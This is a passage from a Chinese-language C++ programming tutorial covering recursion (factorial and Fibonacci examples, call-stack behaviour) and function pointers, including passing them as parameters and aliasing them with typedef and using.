返回。</li><li> <code>countdown(2)</code> 返回。</li><li> … 依次回溯 …</li><li><code>countdown(5)</code> 返回到 <code>main</code>。</li></ol><p>每次函数调用都会在称为“调用栈”的内存区域中创建一个新的记录（栈帧），用于存储函数的局部变量和返回地址。当函数返回时，其栈帧被移除。</p><p><strong>示例：使用递归计算阶乘</strong></p><p>阶乘 <code>n!</code> 定义为 <code>n * (n-1) * ... * 1</code>，并且 <code>0! = 1</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归函数：计算 n 的阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基线条件：0! = 1</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 递归步骤：n! = n * (n-1)!</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>); <span class="comment">// 函数调用自身</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot;! = &quot;</span> &lt;&lt; factorial(num) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 5! = 120</span></span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot;! = &quot;</span> &lt;&lt; factorial(num) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 0! = 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-9-2-包含多个递归调用的递归"><a href="#7-9-2-包含多个递归调用的递归" class="headerlink" title="7.9.2 包含多个递归调用的递归"></a>7.9.2 包含多个递归调用的递归</h3><p>在这种形式中，函数在一次执行中可能会调用自身多次。这通常用于解决可以分解为多个相同类型子问题的问题，例如树的遍历或某些数学序列的计算。</p><p><strong>示例：使用递归计算斐波那契数列</strong></p><p>斐波那契数列定义如下：<code>F(0) = 0</code>, <code>F(1) = 1</code>, <code>F(n) = F(n-1) + F(n-2)</code> for <code>n &gt; 1</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归函数：计算第 n 个斐波那契数</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基线条件</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 递归步骤：F(n) = F(n-1) + F(n-2)</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 函数调用自身两次</span></span><br><span class="line">        <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> term = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci(&quot;</span> &lt;&lt; term &lt;&lt; <span class="string">&quot;) = &quot;</span> &lt;&lt; fibonacci(term) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Fibonacci(10) = 55</span></span><br><span class="line"></span><br><span class="line">    term = <span class="number">6</span>;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci(&quot;</span> &lt;&lt; term &lt;&lt; <span class="string">&quot;) = &quot;</span> &lt;&lt; fibonacci(term) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Fibonacci(6) = 8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>工作原理和潜在问题:</strong></p><p>计算 <code>fibonacci(5)</code> 的过程大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fibonacci(5)</span><br><span class="line">  -&gt; fibonacci(4) + fibonacci(3)</span><br><span class="line">       -&gt; (fibonacci(3) + fibonacci(2)) + (fibonacci(2) + fibonacci(1))</span><br><span class="line">            -&gt; ((fibonacci(2) + fibonacci(1)) + (fibonacci(1) + fibonacci(0))) + ((fibonacci(1) + fibonacci(0)) + 1)</span><br><span class="line">                 -&gt; (((fibonacci(1) + fibonacci(0)) + 1) + (1 + 0)) + ((1 + 0) + 1)</span><br><span class="line">                      -&gt; (((1 + 0) + 1) + (1 + 0)) + ((1 + 0) + 1)</span><br><span class="line">                      -&gt; ((1 + 1) + 1) + (1 + 1)</span><br><span class="line">                      -&gt; (2 + 1) + 2</span><br><span class="line">                      -&gt; 3 + 2</span><br><span class="line">                      -&gt; 5</span><br></pre></td></tr></table></figure><p>(注意：实际计算 <code>fibonacci(10)</code> 会涉及更多层调用)</p><p>这种包含多个递归调用的实现方式（如此处的斐波那契）虽然直观地反映了数学定义，但效率可能非常低。例如，在计算 <code>fibonacci(5)</code> 时，<code>fibonacci(3)</code> 被计算了两次，<code>fibonacci(2)</code> 被计算了三次。随着 <code>n</code> 的增大，重复计算的次数呈指数级增长。</p><p>对于这类问题，<strong>迭代</strong>（使用循环）或其他优化技术（如<strong>记忆化</strong>，即存储已计算的结果）通常是更高效的解决方案。</p><p><strong>递归的优缺点:</strong></p><ul><li><strong>优点:</strong><ul><li>  对于某些问题（如树遍历、分治算法），递归可以提供非常自然、简洁和易于理解的解决方案。</li><li>  代码可以更接近问题的数学或逻辑描述。</li></ul></li><li><strong>缺点:</strong><ul><li>  可能效率低下，特别是当存在大量重复计算或深度递归时。</li><li>  每次函数调用都有开销（创建栈帧），可能导致性能问题。</li><li>  深度递归可能耗尽调用栈空间，导致栈溢出错误。</li><li>  调试递归函数可能比调试迭代函数更困难。</li></ul></li></ul><p>在选择使用递归还是迭代时，需要权衡代码的清晰度、简洁性与潜在的性能和内存消耗。</p><h2 id="7-10-函数指针"><a href="#7-10-函数指针" class="headerlink" title="7.10 函数指针"></a>7.10 函数指针</h2><p>就像变量有地址，函数也有地址。<strong>函数指针 (Function Pointer)</strong> 就是一个指向函数内存地址的指针变量。通过函数指针，我们可以像调用普通函数一样调用它所指向的函数。函数指针的主要用途包括：</p><ul><li>  将函数作为参数传递给其他函数（例如，实现回调机制或策略模式）。</li><li>  在运行时决定调用哪个函数。</li><li>  构建函数表或调度表。</li></ul><h3 id="7-10-1-函数指针的基础知识"><a href="#7-10-1-函数指针的基础知识" class="headerlink" title="7.10.1 函数指针的基础知识"></a>7.10.1 函数指针的基础知识</h3><p><strong>声明函数指针:</strong></p><p>声明函数指针时，必须指定它所指向的函数的<strong>返回类型</strong>和<strong>参数列表类型</strong>。这确保了类型安全，即函数指针只能指向具有匹配签名的函数。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return_type (*pointer_name)(parameter_type_list);</span><br></pre></td></tr></table></figure><ul><li>  <code>return_type</code>: 函数指针指向的函数的返回类型。</li><li>  <code>pointer_name</code>: 函数指针变量的名称。</li><li>  <code>parameter_type_list</code>: 函数指针指向的函数的参数类型列表，用逗号分隔。</li><li>  <code>(*pointer_name)</code>: 括号是必需的，它表明 <code>pointer_name</code> 是一个指针。如果没有括号，<code>return_type *pointer_name(parameter_type_list);</code> 会被解释为一个返回 <code>return_type*</code> 类型的函数声明。</li></ul><p><strong>示例声明:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明一个名为 func_ptr 的函数指针</span></span><br><span class="line"><span class="comment">// 它指向一个接受两个 int 参数并返回 int 的函数</span></span><br><span class="line"><span class="keyword">int</span> (*func_ptr)(<span class="keyword">int</span>, <span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个名为 process 的函数指针</span></span><br><span class="line"><span class="comment">// 它指向一个接受 const char* 参数且无返回值 (void) 的函数</span></span><br><span class="line"><span class="keyword">void</span> (*process)(<span class="keyword">const</span> <span class="keyword">char</span>*);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个名为 compare 的函数指针</span></span><br><span class="line"><span class="comment">// 它指向一个接受两个 double 参数并返回 bool 的函数</span></span><br><span class="line"><span class="keyword">bool</span> (*compare)(<span class="keyword">double</span>, <span class="keyword">double</span>);</span><br></pre></td></tr></table></figure><p><strong>初始化函数指针:</strong></p><p>可以将函数的名称（不带括号）直接赋给具有匹配签名的函数指针。函数名本身就代表了函数的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 func_ptr 指向 add 函数</span></span><br><span class="line">func_ptr = add; <span class="comment">// 或者 func_ptr = &amp;add; (&amp; 是可选的)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 process 指向 print_message 函数</span></span><br><span class="line">process = print_message;</span><br></pre></td></tr></table></figure><p><strong>使用函数指针调用函数:</strong></p><p>可以通过函数指针来调用它所指向的函数，语法与直接调用函数类似。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result = func_ptr(<span class="number">5</span>, <span class="number">3</span>); <span class="comment">// 调用 add(5, 3)，result 将是 8</span></span><br><span class="line">process(<span class="string">&quot;Hello via pointer!&quot;</span>); <span class="comment">// 调用 print_message(&quot;Hello via pointer!&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以使用显式解引用语法 (较少见)</span></span><br><span class="line"><span class="comment">// int result = (*func_ptr)(5, 3);</span></span><br><span class="line"><span class="comment">// (*process)(&quot;Hello via pointer!&quot;);</span></span><br></pre></td></tr></table></figure><h3 id="7-10-2-函数指针示例"><a href="#7-10-2-函数指针示例" class="headerlink" title="7.10.2 函数指针示例"></a>7.10.2 函数指针示例</h3><p>下面是一个完整的示例，演示如何声明、初始化和使用函数指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数 2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">subtract</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数 3</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_result</span><span class="params">(<span class="keyword">int</span> result)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The result is: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明一个指向接受两个 int 并返回 int 的函数的指针</span></span><br><span class="line">    <span class="keyword">int</span> (*operation)(<span class="keyword">int</span>, <span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个指向接受一个 int 且无返回值的函数的指针</span></span><br><span class="line">    <span class="keyword">void</span> (*show)(<span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 operation 指向 add 函数</span></span><br><span class="line">    operation = add;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using &#x27;add&#x27; function via pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = operation(<span class="number">10</span>, <span class="number">5</span>); <span class="comment">// 调用 add(10, 5)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 + 5 = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 15</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 operation 指向 subtract 函数</span></span><br><span class="line">    operation = subtract;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nUsing &#x27;subtract&#x27; function via pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> diff = operation(<span class="number">10</span>, <span class="number">5</span>); <span class="comment">// 调用 subtract(10, 5)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 - 5 = &quot;</span> &lt;&lt; diff &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 show 指向 display_result 函数</span></span><br><span class="line">    show = display_result;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDisplaying difference using &#x27;show&#x27; pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    show(diff); <span class="comment">// 调用 display_result(diff)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-10-3-深入探讨函数指针"><a href="#7-10-3-深入探讨函数指针" class="headerlink" title="7.10.3 深入探讨函数指针"></a>7.10.3 深入探讨函数指针</h3><p><strong>函数指针作为函数参数:</strong></p><p>一个常见的用途是将函数指针作为参数传递给另一个函数。这允许调用函数根据传入的函数指针来定制其行为。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：检查一个数字是否为偶数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_even</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：检查一个数字是否为正数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_positive</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：打印满足特定条件的数字</span></span><br><span class="line"><span class="comment">// 参数：一个整数向量，一个函数指针 (指向检查条件的函数)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_numbers_if</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; numbers, <span class="keyword">bool</span> (*check)(<span class="keyword">int</span>))</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers satisfying the condition: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check(num)) &#123; <span class="comment">// 使用传入的函数指针调用检查函数</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">1</span>, <span class="number">-2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking for even numbers:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_numbers_if(data, is_even); <span class="comment">// 传递 is_even 函数的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nChecking for positive numbers:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_numbers_if(data, is_positive); <span class="comment">// 传递 is_positive 函数的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Checking for even numbers:</span><br><span class="line">Numbers satisfying the condition: -2 4 6</span><br><span class="line">Checking for positive numbers:</span><br><span class="line">Numbers satisfying the condition: 1 3 4 6</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>print_numbers_if</code> 函数的行为由传递给它的 <code>check</code> 函数指针决定。</p><h3 id="7-10-4-使用-typedef-或-using-进行简化"><a href="#7-10-4-使用-typedef-或-using-进行简化" class="headerlink" title="7.10.4 使用 typedef 或 using 进行简化"></a>7.10.4 使用 typedef 或 using 进行简化</h3><p>函数指针的声明语法可能比较冗长和复杂。可以使用 <code>typedef</code> (传统方式) 或 <code>using</code> (C++11 及以后推荐) 来创建函数指针类型的别名，使代码更清晰。</p><p><strong>使用 <code>typedef</code>:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 typedef 定义函数指针类型别名</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*CheckFunction)</span><span class="params">(<span class="keyword">int</span>)</span></span>; <span class="comment">// CheckFunction 是指向 (int) -&gt; bool 函数的指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*DisplayFunction)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_if</span><span class="params">(<span class="keyword">int</span> val, CheckFunction check, DisplayFunction display)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check(val)) &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition met!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition not met.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_negative</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n &lt; <span class="number">0</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CheckFunction checker = is_negative; <span class="comment">// 使用别名声明和初始化</span></span><br><span class="line">    DisplayFunction printer = show_message;</span><br><span class="line"></span><br><span class="line">    print_if(<span class="number">-5</span>, checker, printer); <span class="comment">// 输出: Condition met!</span></span><br><span class="line">    print_if(<span class="number">10</span>, checker, printer); <span class="comment">// 输出: Condition not met.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用 <code>using</code> (C++11):</strong></p><p><code>using</code> 提供了更直观、更一致的别名语法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 using 定义函数指针类型别名 (推荐)</span></span><br><span class="line"><span class="keyword">using</span> CheckFunction = <span class="keyword">bool</span> (*)(<span class="keyword">int</span>); <span class="comment">// 指向 (int) -&gt; bool 函数的指针类型</span></span><br><span class="line"><span class="keyword">using</span> DisplayFunction = <span class="keyword">void</span> (*)(<span class="keyword">const</span> <span class="keyword">char</span>*);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (函数 print_if, is_negative, show_message 和 main 函数同上) ...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_if</span><span class="params">(<span class="keyword">int</span> val, CheckFunction check, DisplayFunction display)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check(val)) &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition met!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition not met.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_negative</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n &lt; <span class="number">0</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg 